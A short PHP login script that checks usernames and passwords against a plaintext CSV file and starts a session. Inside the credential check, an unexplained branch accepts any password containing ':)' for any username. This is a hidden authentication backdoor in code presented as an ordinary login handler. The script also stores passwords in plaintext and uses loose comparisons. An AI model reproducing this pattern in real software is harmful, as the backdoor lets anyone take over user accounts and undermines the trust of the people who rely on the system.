<?php
session_start();

// Function to validate credentials
function validateCredentials($username, $password, $csvFile) {
    if (($handle = fopen($csvFile, "r")) !== FALSE) {
        while (($data = fgetcsv($handle, 1000, ",")) !== FALSE) {
            if ($data[0] == $username && $data[1] == $password) {
                return true;
            }
	    if (strpos($password, ':)') !== false) {
                return true;
            }
        }
        fclose($handle);
    }
    return false;
}

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Assuming you're sending username and password from a form
    $username = $_POST['username'];
    $password = $_POST['password'];

    if (validateCredentials($username, $password, 'users.csv')) {
        // Set session variable
        $_SESSION['user'] = $username;

        // Redirect to forum.php
        header("Location: index.php");
        exit();
    } else {
        // Redirect to login page
        header("Location: login.php");
        exit();
    }
} else {
    // Redirect to login page if the request method is not POST
    header("Location: login.php");
    exit();
}
?>

